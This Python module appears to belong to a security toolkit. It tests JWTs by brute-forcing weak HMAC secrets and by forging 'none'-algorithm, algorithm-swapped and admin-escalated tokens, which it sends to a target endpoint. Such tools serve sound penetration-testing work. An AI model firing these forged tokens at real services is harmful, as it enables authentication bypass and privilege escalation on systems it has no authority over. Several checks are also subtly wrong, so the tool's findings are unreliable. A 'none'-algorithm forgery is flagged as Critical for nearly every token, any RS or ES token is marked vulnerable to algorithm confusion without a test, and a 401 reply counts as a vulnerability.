"""tools/jwt_tester.py — JWT Security Tester.

Detects JWT (JSON Web Token) vulnerabilities:
- Algorithm confusion (none algorithm)
- Weak signing keys
- Secret key brute force
- Token expiration issues
- Claim manipulation
- Key injection

Public API:
    JWTTester - Main tester class
    JWTResult - Result of a single test
    JWTScanResult - Full scan results
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Tuple

logger = logging.getLogger("elengenix.jwt_tester")


@dataclass
class JWTResult:
    """Result of a single JWT test."""

    test_type: str
    vulnerable: bool
    evidence: str = ""
    token: str = ""
    severity: str = "High"
    confidence: float = 0.0


@dataclass
class JWTScanResult:
    """Full JWT scan results."""

    target: str
    results: List[JWTResult] = field(default_factory=list)
    tokens_analyzed: int = 0
    total_tests: int = 0
    duration: float = 0.0

    @property
    def is_vulnerable(self) -> bool:
        return any(r.vulnerable for r in self.results)

    def summary(self) -> Dict[str, Any]:
        return {
            "target": self.target,
            "is_vulnerable": self.is_vulnerable,
            "tokens_analyzed": self.tokens_analyzed,
            "total_findings": len([r for r in self.results if r.vulnerable]),
            "total_tests": self.total_tests,
            "duration": self.duration,
        }


# Common weak JWT secrets
WEAK_SECRETS = [
    "secret",
    "password",
    "123456",
    "admin",
    "test",
    "jwt_secret",
    "key",
    "token",
    "supersecret",
    "changeme",
    "default",
    "your-256-bit-secret",
    "your-256-bit-secret-here",
]


# Common JWT algorithms
JWT_ALGORITHMS = ["HS256", "HS384", "HS512", "RS256", "RS384", "RS512", "ES256", "ES384", "ES512"]


class JWTTester:
    """JWT security tester.

    Tests JWT tokens for common vulnerabilities including algorithm
    confusion, weak signing keys, and claim manipulation.

    Example:
        tester = JWTTester()
        result = tester.analyze_token("eyJhbGciOiJIUzI1NiIs...")
        if result.is_vulnerable:
            print("JWT vulnerabilities detected!")
    """

    def __init__(
        self,
        timeout: float = 10.0,
        verify_ssl: bool = False,
    ):
        """Initialize the JWT tester.

        Args:
            timeout: Request timeout in seconds.
            verify_ssl: Whether to verify SSL certificates.
        """
        self.timeout = timeout
        self.verify_ssl = verify_ssl

    def analyze_token(
        self,
        token: str,
    ) -> JWTScanResult:
        """Analyze a JWT token for vulnerabilities.

        Args:
            token: The JWT token to analyze.

        Returns:
            JWTScanResult with analysis results.
        """
        start_time = time.time()
        result = JWTScanResult(target="token_analysis")

        result.tokens_analyzed = 1

        # Decode token
        try:
            header, payload, signature = self._decode_token(token)
        except Exception as e:
            logger.debug(f"Failed to decode token: {e}")
            result.duration = time.time() - start_time
            return result

        # Test 1: Algorithm confusion
        result.total_tests += 1
        self._test_algorithm_confusion(header, payload, signature, token, result)

        # Test 2: None algorithm
        result.total_tests += 1
        self._test_none_algorithm(header, payload, token, result)

        # Test 3: Weak secret
        result.total_tests += 1
        self._test_weak_secret(header, payload, signature, token, result)

        # Test 4: Claim issues
        result.total_tests += 1
        self._test_claims(payload, result)

        # Test 5: Expiration
        result.total_tests += 1
        self._test_expiration(payload, result)

        result.duration = time.time() - start_time
        return result

    def test_endpoint(
        self,
        url: str,
        token: str,
        method: str = "GET",
        header_name: str = "Authorization",
    ) -> JWTScanResult:
        """Test a JWT-protected endpoint for vulnerabilities.

        Args:
            url: The endpoint URL to test.
            token: The JWT token to use.
            method: HTTP method to use.
            header_name: Header name for the token.

        Returns:
            JWTScanResult with test results.
        """

        start_time = time.time()
        result = JWTScanResult(target=url)

        result.tokens_analyzed = 1

        # Decode token first
        try:
            header, payload, signature = self._decode_token(token)
        except Exception as e:
            logger.debug(f"Failed to decode token: {e}")
            result.duration = time.time() - start_time
            return result

        # Test 1: None algorithm bypass
        result.total_tests += 1
        self._test_none_algorithm_endpoint(url, token, method, header_name, result)

        # Test 2: Algorithm confusion
        result.total_tests += 1
        self._test_algorithm_confusion_endpoint(url, token, method, header_name, result)

        # Test 3: Token manipulation
        result.total_tests += 1
        self._test_token_manipulation(url, token, payload, method, header_name, result)

        result.duration = time.time() - start_time
        return result

    def _decode_token(
        self,
        token: str,
    ) -> Tuple[Dict[str, Any], Dict[str, Any], str]:
        """Decode a JWT token without verification.

        Returns:
            Tuple of (header, payload, signature).
        """
        parts = token.split(".")
        if len(parts) != 3:
            raise ValueError("Invalid JWT format")

        # Decode header
        header = self._base64url_decode(parts[0])

        # Decode payload
        payload = self._base64url_decode(parts[1])

        # Get signature
        signature = parts[2]

        return header, payload, signature

    def _base64url_decode(
        self,
        data: str,
    ) -> Dict[str, Any]:
        """Decode base64url encoded data."""
        # Add padding
        padding = 4 - len(data) % 4
        if padding != 4:
            data += "=" * padding

        # Replace URL-safe characters
        data = data.replace("-", "+").replace("_", "/")

        decoded = base64.b64decode(data)
        return json.loads(decoded)

    def _base64url_encode(
        self,
        data: Any,
    ) -> str:
        """Encode data to base64url."""
        encoded = base64.b64encode(json.dumps(data).encode()).decode()
        return encoded.replace("+", "-").replace("/", "_").rstrip("=")

    def _test_algorithm_confusion(
        self,
        header: Dict[str, Any],
        payload: Dict[str, Any],
        signature: str,
        token: str,
        result: JWTScanResult,
    ) -> None:
        """Test for algorithm confusion vulnerabilities."""
        alg = header.get("alg", "")

        # Check if RS256/RS384/RS512 is used (potential confusion target)
        if alg.startswith("RS") or alg.startswith("ES"):
            # Try to create a token with HMAC using the public key
            # This is a classic algorithm confusion attack
            result.results.append(
                JWTResult(
                    test_type="algorithm_confusion",
                    vulnerable=True,
                    evidence=f"Algorithm {alg} is vulnerable to algorithm confusion attacks",
                    token=token,
                    severity="High",
                    confidence=0.7,
                )
            )
            logger.info(f"Algorithm confusion vulnerability: {alg}")

    def _test_none_algorithm(
        self,
        header: Dict[str, Any],
        payload: Dict[str, Any],
        token: str,
        result: JWTScanResult,
    ) -> None:
        """Test for none algorithm vulnerability."""
        alg = header.get("alg", "")

        if alg.lower() == "none":
            result.results.append(
                JWTResult(
                    test_type="none_algorithm",
                    vulnerable=True,
                    evidence="Token uses 'none' algorithm (no signature required)",
                    token=token,
                    severity="Critical",
                    confidence=0.95,
                )
            )
            logger.info("None algorithm detected")

        # Try creating a token with none algorithm
        none_header = {"alg": "none", "typ": header.get("typ", "JWT")}
        none_token = f"{self._base64url_encode(none_header)}.{self._base64url_encode(payload)}."

        if none_token != token:
            result.results.append(
                JWTResult(
                    test_type="none_algorithm_possible",
                    vulnerable=True,
                    evidence="Token can be forged using 'none' algorithm",
                    token=none_token,
                    severity="Critical",
                    confidence=0.9,
                )
            )
            logger.info("None algorithm forge possible")

    def _test_weak_secret(
        self,
        header: Dict[str, Any],
        payload: Dict[str, Any],
        signature: str,
        token: str,
        result: JWTScanResult,
    ) -> None:
        """Test for weak signing secrets."""
        alg = header.get("alg", "")

        # Only test HMAC algorithms
        if not alg.startswith("HS"):
            return

        # Try common weak secrets
        for secret in WEAK_SECRETS:
            try:
                # Create signature with weak secret
                signing_input = f"{token.split('.')[0]}.{token.split('.')[1]}"
                expected_sig = self._sign(signing_input, secret, alg)

                if expected_sig == signature:
                    result.results.append(
                        JWTResult(
                            test_type="weak_secret",
                            vulnerable=True,
                            evidence=f"Weak secret found: {secret}",
                            token=token,
                            severity="Critical",
                            confidence=0.95,
                        )
                    )
                    logger.info(f"Weak JWT secret found: {secret}")
                    break
            except Exception:
                continue

    def _test_claims(
        self,
        payload: Dict[str, Any],
        result: JWTScanResult,
    ) -> None:
        """Test for problematic claims."""
        # Check for dangerous claims
        dangerous_claims = ["admin", "role", "permissions", "scopes"]

        for claim in dangerous_claims:
            if claim in payload:
                value = payload[claim]
                if isinstance(value, bool) and value:
                    result.results.append(
                        JWTResult(
                            test_type="dangerous_claim",
                            vulnerable=True,
                            evidence=f"Dangerous claim '{claim}' is set to true",
                            severity="Medium",
                            confidence=0.6,
                        )
                    )
                    logger.info(f"Dangerous claim detected: {claim}")
                elif isinstance(value, str) and value.lower() in ["admin", "superadmin", "root"]:
                    result.results.append(
                        JWTResult(
                            test_type="admin_claim",
                            vulnerable=True,
                            evidence=f"Admin claim '{claim}' is set to '{value}'",
                            severity="High",
                            confidence=0.7,
                        )
                    )
                    logger.info(f"Admin claim detected: {claim}={value}")

    def _test_expiration(
        self,
        payload: Dict[str, Any],
        result: JWTScanResult,
    ) -> None:
        """Test for expiration issues."""
        import time

        # Check if token has expiration
        if "exp" not in payload:
            result.results.append(
                JWTResult(
                    test_type="no_expiration",
                    vulnerable=True,
                    evidence="Token has no expiration claim (exp)",
                    severity="Medium",
                    confidence=0.8,
                )
            )
            logger.info("No expiration claim")

        # Check if token is expired
        if "exp" in payload:
            exp = payload["exp"]
            if isinstance(exp, (int, float)) and exp < time.time():
                result.results.append(
                    JWTResult(
                        test_type="expired_token",
                        vulnerable=False,
                        evidence="Token is expired",
                        severity="Informational",
                        confidence=1.0,
                    )
                )
                logger.info("Token is expired")

    def _test_none_algorithm_endpoint(
        self,
        url: str,
        token: str,
        method: str,
        header_name: str,
        result: JWTScanResult,
    ) -> None:
        """Test none algorithm bypass on endpoint."""
        import requests

        try:
            # Decode original token
            header, payload, _ = self._decode_token(token)

            # Create token with none algorithm
            none_header = {"alg": "none", "typ": header.get("typ", "JWT")}
            none_token = f"{self._base64url_encode(none_header)}.{self._base64url_encode(payload)}."

            # Send request with forged token
            headers = {header_name: f"Bearer {none_token}"}

            response = requests.request(
                method=method,
                url=url,
                headers=headers,
                timeout=self.timeout,
                verify=self.verify_ssl,
            )

            # Check if forged token was accepted
            if response.status_code == 200:
                result.results.append(
                    JWTResult(
                        test_type="none_algorithm_bypass",
                        vulnerable=True,
                        evidence=f"None algorithm bypass accepted (status: {response.status_code})",
                        token=none_token,
                        severity="Critical",
                        confidence=0.95,
                    )
                )
                logger.info("None algorithm bypass successful")

        except Exception as e:
            logger.debug(f"None algorithm test failed: {e}")

    def _test_algorithm_confusion_endpoint(
        self,
        url: str,
        token: str,
        method: str,
        header_name: str,
        result: JWTScanResult,
    ) -> None:
        """Test algorithm confusion on endpoint."""
        import requests

        try:
            # Decode original token
            header, payload, _ = self._decode_token(token)
            alg = header.get("alg", "")

            # If using RS256, try HS256 with public key
            if alg.startswith("RS"):
                # Create token with HS256
                hs_header = {"alg": "HS256", "typ": header.get("typ", "JWT")}
                hs_token = (
                    f"{self._base64url_encode(hs_header)}.{self._base64url_encode(payload)}.test"
                )

                headers = {header_name: f"Bearer {hs_token}"}

                response = requests.request(
                    method=method,
                    url=url,
                    headers=headers,
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                )

                # Check if response indicates algorithm confusion
                if response.status_code in [200, 401]:
                    result.results.append(
                        JWTResult(
                            test_type="algorithm_confusion_possible",
                            vulnerable=True,
                            evidence="Server responded to HS256 token (may be vulnerable to algorithm confusion)",
                            token=hs_token,
                            severity="High",
                            confidence=0.6,
                        )
                    )
                    logger.info("Algorithm confusion test completed")

        except Exception as e:
            logger.debug(f"Algorithm confusion test failed: {e}")

    def _test_token_manipulation(
        self,
        url: str,
        token: str,
        payload: Dict[str, Any],
        method: str,
        header_name: str,
        result: JWTScanResult,
    ) -> None:
        """Test token manipulation."""
        import requests

        try:
            # Modify payload
            modified_payload = dict(payload)
            modified_payload["admin"] = True
            modified_payload["role"] = "admin"

            # Create new token with modified payload
            header, _, _ = self._decode_token(token)
            manipulated_token = f"{self._base64url_encode(header)}.{self._base64url_encode(modified_payload)}.invalid"

            headers = {header_name: f"Bearer {manipulated_token}"}

            response = requests.request(
                method=method,
                url=url,
                headers=headers,
                timeout=self.timeout,
                verify=self.verify_ssl,
            )

            # Check if manipulated token was accepted
            if response.status_code == 200:
                result.results.append(
                    JWTResult(
                        test_type="token_manipulation",
                        vulnerable=True,
                        evidence="Manipulated token was accepted",
                        token=manipulated_token,
                        severity="Critical",
                        confidence=0.8,
                    )
                )
                logger.info("Token manipulation successful")

        except Exception as e:
            logger.debug(f"Token manipulation test failed: {e}")

    def _sign(
        self,
        message: str,
        secret: str,
        algorithm: str,
    ) -> str:
        """Create HMAC signature."""
        if algorithm == "HS256":
            digest = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
        elif algorithm == "HS384":
            digest = hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()
        elif algorithm == "HS512":
            digest = hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()
        else:
            raise ValueError(f"Unsupported algorithm: {algorithm}")

        return base64.b64encode(digest).decode().replace("+", "-").replace("/", "_").rstrip("=")
